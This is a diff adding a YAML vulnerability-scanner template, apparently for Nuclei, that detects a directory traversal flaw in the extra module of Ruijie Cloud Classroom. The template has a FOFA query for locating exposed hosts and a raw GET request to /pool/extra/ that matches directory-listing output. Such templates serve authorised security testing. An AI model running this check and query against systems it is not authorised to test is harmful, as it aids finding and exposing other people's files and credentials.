@@ -1,0 +1,24 @@
+id: ruijie-cloudclass-extra-path-traversal
+
+info:
+  name: 锐捷云课堂 extra 模块目录遍历漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="云课堂主机"
+        锐捷云课堂系统在 extra 模块中存在目录遍历缺陷，攻击者可利用该漏洞通过构造特定请求读取受限目录内容。该缺陷可能暴露应用程序源代码、配置文件、数据库凭证及系统关键文件，导致敏感数据泄露和系统权限被滥用
+  tags: 锐捷云课堂
+
+http:
+- raw:
+  - |
+    GET /pool/extra/ HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'Listing'
